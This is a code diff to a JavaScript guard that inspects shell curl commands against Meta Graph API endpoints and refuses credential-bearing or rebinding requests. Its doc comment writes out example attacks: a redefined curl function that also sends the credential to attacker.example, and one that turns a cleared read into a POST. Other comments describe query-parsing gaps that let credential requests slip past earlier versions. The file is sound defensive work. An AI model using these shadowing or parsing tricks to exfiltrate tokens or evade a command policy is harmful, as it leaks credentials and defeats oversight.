@@ -543,6 +543,59 @@ function metaTargetIdentityViolation(cmd) {
 }
 
 /**
+ * Same-command shadowing of a request client.
+ *
+ * Round 10, F2/F3. The guard identifies the client by reading the token `curl`.
+ * The shell can change what that token MEANS before it runs:
+ *
+ *   curl() { command curl "$@" https://attacker.example/; }; curl <sanctioned read>
+ *   curl() { command curl -X POST "$@"; };                   curl <sanctioned read>
+ *
+ * The first appends a second destination and the credential goes to both. The
+ * second turns an allowlisted READ of a protected edge into a POST against it —
+ * a live subscription mutation, while method classification reports GET.
+ *
+ * BOUNDED BY CONSTRUCTION, and the bound is the point. This detects a binding
+ * established INSIDE the command being inspected. It cannot detect — and must
+ * never be described as detecting — a function or alias defined in an earlier
+ * shell turn, a sourced file, a shell startup file, a shim earlier on `PATH`, or
+ * a replaced client binary. None of those leave a marker in this command. That
+ * residue belongs to blocker-meta-egress-boundary-required-2026-08-12 and is not
+ * closable by reading command text.
+ */
+const SHADOWABLE_CLIENT = '(?:curl|wget|xh|httpie|http)';
+const SHADOW_PATTERNS = [
+  // function curl { … }   /   function curl() { … }
+  new RegExp('(^|[;&|(\\s])function\\s+' + SHADOWABLE_CLIENT + '\\b', 'i'),
+  // curl() { … }
+  new RegExp('(^|[;&|(\\s])' + SHADOWABLE_CLIENT + '\\s*\\(\\s*\\)\\s*\\{', 'i'),
+  // alias curl=…
+  new RegExp('(^|[;&|(\\s])alias\\s+' + SHADOWABLE_CLIENT + '\\s*=', 'i'),
+  // curl=… — a binding that changes how the apparent client is invoked
+  new RegExp('(^|[;&|(\\s])' + SHADOWABLE_CLIENT + '\\s*=', 'i'),
+  // eval / source of visible text that establishes such a binding
+  new RegExp('(^|[;&|(\\s])(eval|source|\\.)\\s+[^;&|]*\\b' + SHADOWABLE_CLIENT + '\\s*(\\(\\s*\\)|=)', 'i'),
+];
+
+/** @returns {{reason:string, remedy:string}|null} */
+function shellShadowViolation(cmd) {
+  const s = String(cmd || '');
+  for (const re of SHADOW_PATTERNS) {
+    if (!re.test(s)) continue;
+    return {
+      reason:
+        'This command redefines a request client before using it — as a function, an alias, or a binding. Whatever the ' +
+        'command then appears to request, the shell decides what actually runs: a redefinition can append a second ' +
+        'destination, or force a write method against an endpoint the policy cleared as a read. Nothing later in this ' +
+        'command can be trusted to describe the request that leaves the machine.',
+      remedy:
+        'invoke the request client directly, without defining or rebinding its name in the same command.',
+    };
+  }
+  return null;
+}
+
+/**
  * A Meta curl must have exactly ONE destination.
  *
  * curl applies shared options — `-H`, and `-G` data parameters — to EVERY URL in
@@ -807,7 +860,13 @@ function isGraphShapedPath(rawPath) {
   // A credential exchange is identifiable from its query alone — checked
   // against the authoritative parameter set, with keys percent-decoded by
   // splitQuery(), so `client%5Fsecret` cannot slip past a literal match.
-  if (hasTokenExchangeParam(splitQuery(queryPart))) return true;
+  const inlineParams = splitQuery(queryPart);
+  if (hasTokenExchangeParam(inlineParams)) return true;
+
+  // Round 10, F4: a `fields` value asking for credential material or a
+  // token-minting edge identifies a Graph request on its own, even when the
+  // path is `/me` or otherwise unremarkable.
+  if (fieldsRequestCredential(inlineParams)) return true;
 
   // Versioned Graph URL — nothing else uses this shape.
   if (VERSION_SEGMENT_RE.test(pathPartRaw)) return true;
@@ -821,10 +880,66 @@ function isGraphShapedPath(rawPath) {
   if (segs.length === 0) return false;
   const joined = segs.join('/');
 
+  // NOTE on `/me` (round 10, F4): treating it as Graph-shaped unconditionally
+  // was tried and reverted. It denied an ordinary `https://$SVC/me?fields=id`
+  // that carries no credential and is not a Graph request — caught by this
+  // suite's own control. Classification for that case keys on the CREDENTIAL
+  // instead, in isMetaGraphCommand(), which is both narrower and the actual
+  // hazard: `/me` without a token can do nothing at Graph.
+
   if (protectedRootPaths().has(joined)) return true; // oauth/access_token, device/login, debug_token …
   // /{id}/messages, /{id}/subscribed_apps, /{id}/accounts, /{id}/request_code …
   if (segs.length >= 2 && protectedEdges().has(segs[segs.length - 1])) return true;
 
+  return false;
+}
+
+/**
+ * Parameter and header shapes that carry a Meta credential.
+ *
+ * Round 10, F4: classification of an indeterminate target depended entirely on
+ * the PATH looking Graph-shaped. `/me` is Graph's canonical self node and is not
+ * a version segment, a protected root or a protected edge — so
+ * `https://$HOST/me?fields=accounts{access_token}` reached Graph with a
+ * credential while `isMetaGraphCommand()` returned false and the policy was
+ * never entered. Every downstream rule would have refused it instantly.
+ *
+ * These are credential-bearing PARAMETER and HEADER names, matched on the wire
+ * shape of the request. No variable NAME is ever inspected — a name carries no
+ * provenance, and `$X` is not safer than `$META_GRAPH_TOKEN`.
+ */
+const CREDENTIAL_PARAM_KEYS = new Set([
+  'access_token',
+  'input_token',
+  'client_secret',
+  'appsecret_proof',
+  'code_verifier',
+  'fb_exchange_token',
+  'client_code',
+]);
+const BEARER_HEADER_RE = /authorization\s*:\s*bearer\b/i;
+
+/** Does this command carry a Meta credential on the wire? */
+function carriesCredential(cmd, params) {
+  for (const p of params || []) {
+    if (p && typeof p.key === 'string' && CREDENTIAL_PARAM_KEYS.has(p.key.trim().toLowerCase())) return true;
+  }
+  return BEARER_HEADER_RE.test(String(cmd || ''));
+}
+
+/**
+ * A `fields` value that asks for credential material or walks a token-minting
+ * edge is itself proof this is a Meta request, whatever the path spells.
+ */
+function fieldsRequestCredential(params) {
+  for (const p of params || []) {
+    if (!p || String(p.key || '').trim().toLowerCase() !== 'fields') continue;
+    const decoded = safeDecode(String(p.value || ''));
+    if (FORBIDDEN_FIELD_RE.test(decoded)) return true;
+    for (const name of allFieldNames(String(p.value || ''))) {
+      if (TOKEN_MINTING_EDGES.has(String(name).toLowerCase())) return true;
+    }
+  }
   return false;
 }
 
@@ -878,6 +993,16 @@ function isMetaGraphCommand(cmd) {
   // classifyFields() sees them, and cannot disagree about what a cluster meant.
   const params = collectDataParams(s);
   if (hasTokenExchangeParam(params)) return true;
+
+  // A credential on the wire, going somewhere that cannot be identified before
+  // the command runs, is a Meta request until proven otherwise. Classify it so
+  // the policy can refuse it, rather than letting an unreadable destination be
+  // its own excuse.
+  if (carriesCredential(s, params)) return true;
+
+  // A fields value asking for credential material or a token-minting edge is
+  // proof of intent regardless of what the path spells.
+  if (fieldsRequestCredential(params)) return true;
 
   // A file-sourced parameter set (`--data-urlencode "@params.txt"`) makes the
   // effective query unknowable. Combined with an authority that is already
@@ -1503,8 +1628,63 @@ function splitQuery(qs) {
  * Returns [{raw, version, segments, params}], segments being the path AFTER an
  * optional /vNN.N/ version prefix.
  */
+/**
+ * Parse ONE already-tokenised target into the Graph URL shape.
+ *
+ * Round 10, F1: `GRAPH_URL_RE` excludes `&` from its character class, because in
+ * raw command text an unquoted `&` separates commands. But inside a QUOTED curl
+ * operand it is an ordinary query separator — so the scan stopped at the first
+ * `&` and everything after it became invisible to `classifyFields()` and the
+ * credential-field rule. `?metadata=0&fields=access_token` was read as
+ * `?metadata=0`, and a request that asks Graph to return a credential in the
+ * response body was allowed.
+ *
+ * Operating on a token removes the ambiguity entirely: the tokenizer has already
+ * resolved quoting, so no shell metacharacter needs to terminate anything.
+ */
+function parseGraphUrlToken(raw) {
+  const s = String(raw == null ? '' : raw);
+  const afterHost = s.replace(/^(?:https?:\/\/)?[^/?#]*graph\.facebook\.com/i, '');
+  const qIdx = afterHost.indexOf('?');
+  const pathPart = qIdx === -1 ? afterHost : afterHost.slice(0, qIdx);
+  const queryPart = qIdx === -1 ? '' : afterHost.slice(qIdx + 1);
+
+  const segments = pathPart.split('/').filter(Boolean);
+  let version = null;
+  if (segments.length && /^v\d+\.\d+$/i.test(segments[0])) version = segments.shift();
+
+  return { raw: s, version, segments, params: splitQuery(queryPart) };
+}
+
+/** The Graph targets a curl invocation will actually contact, as tokens. */
+function authoritativeGraphTargets(cmd) {
+  const out = [];
+  try {
+    const { invocations } = analyzeRequestTargets(cmd);
+    for (const inv of invocations) {
+      if (inv.client !== 'curl') continue;
+      for (const e of inv.targets) {
+        if (META_HOST_RE.test(String(e.raw || ''))) out.push(String(e.raw));
+      }
+    }
+  } catch (_) {
+    return [];
+  }
+  return out;
+}
+
 function parseGraphUrls(cmd) {
   const src = String(cmd || '');
+
+  // Authoritative path: for a curl invocation, parse the operand curl will
+  // actually contact. The complete query is inspected, every parameter,
+  // repeats included — not a substring that stops at a metacharacter.
+  const authoritative = authoritativeGraphTargets(src);
+  if (authoritative.length) return authoritative.map(parseGraphUrlToken);
+
+  // Fallback for non-curl clients (wget, httpie, interpreters), whose grammars
+  // this extractor does not model. Their own rules refuse them; this only keeps
+  // endpoint detail available to those rules.
   const out = [];
   const re = new RegExp(GRAPH_URL_RE.source, 'gi');
   let m;
@@ -1877,29 +2057,41 @@ function classifyEndpoint(url, params) {
 
 /** Validate the `fields` parameter of an otherwise-allowlisted read. */
 function classifyFields(params) {
-  const raw = paramValue(params, 'fields');
-  if (raw == null || raw === '') return { ok: true, fields: [] };
+  // EVERY occurrence, not just the first. Round 10, F1: `paramValue()` returns
+  // the first match, so `fields=id,name&fields=access_token` was validated on
+  // the benign one and the credential request behind it was never examined.
+  // curl sends both; the policy must read both.
+  const occurrences = (params || [])
+    .filter((p) => p && String(p.key || '').trim().toLowerCase() === 'fields')
+    .map((p) => p.value)
+    .filter((v) => v != null && v !== '');
 
-  const decoded = safeDecode(raw);
-  if (FORBIDDEN_FIELD_RE.test(decoded)) {
-    return {
-      ok: false,
-      ruleId: 'credential-field',
-      reason: 'The `fields` parameter requests credential material (' + decoded.match(FORBIDDEN_FIELD_RE)[0] + ').',
-    };
-  }
+  if (occurrences.length === 0) return { ok: true, fields: [] };
 
-  // Checked at EVERY depth, not just top level — see allFieldNames().
-  const fields = allFieldNames(raw);
-  const bad = fields.filter((f) => !ALLOWED_NODE_FIELDS.has(f.toLowerCase()));
-  if (bad.length) {
-    return {
-      ok: false,
-      ruleId: 'unapproved-field',
-      reason: 'Field(s) not on the metadata allowlist: ' + bad.join(', ') + '.',
-    };
+  const all = [];
+  for (const raw of occurrences) {
+    const decoded = safeDecode(raw);
+    if (FORBIDDEN_FIELD_RE.test(decoded)) {
+      return {
+        ok: false,
+        ruleId: 'credential-field',
+        reason: 'The `fields` parameter requests credential material (' + decoded.match(FORBIDDEN_FIELD_RE)[0] + ').',
+      };
+    }
+
+    // Checked at EVERY depth, not just top level — see allFieldNames().
+    const fields = allFieldNames(raw);
+    const bad = fields.filter((f) => !ALLOWED_NODE_FIELDS.has(f.toLowerCase()));
+    if (bad.length) {
+      return {
+        ok: false,
+        ruleId: 'unapproved-field',
+        reason: 'Field(s) not on the metadata allowlist: ' + bad.join(', ') + '.',
+      };
+    }
+    all.push(...fields);
   }
-  return { ok: true, fields };
+  return { ok: true, fields: all };
 }
 
 // ---------------------------------------------------------------- 5. credentials
@@ -2148,6 +2340,19 @@ function evaluateMetaGraph(cmd) {
   } catch (_) {
     resists = true; // an inspection fault on a request-shaped command fails closed
   }
+  // Same-command client shadowing. First, because if the client has been
+  // rebound then nothing below describes the request that actually runs.
+  let shadow = null;
+  try {
+    shadow = shellShadowViolation(whole);
+  } catch (_) {
+    shadow = {
+      reason: 'This command could not be inspected for request-client rebinding.',
+      remedy: REMEDY_LITERAL_URL,
+    };
+  }
+  if (shadow) return unclassifiable(shadow.reason, shadow.remedy);
+
   // Hygiene required of a Meta request specifically. Scoped here so ordinary
   // non-Meta curl usage elsewhere in the repo is unaffected.
   let hygiene = null;
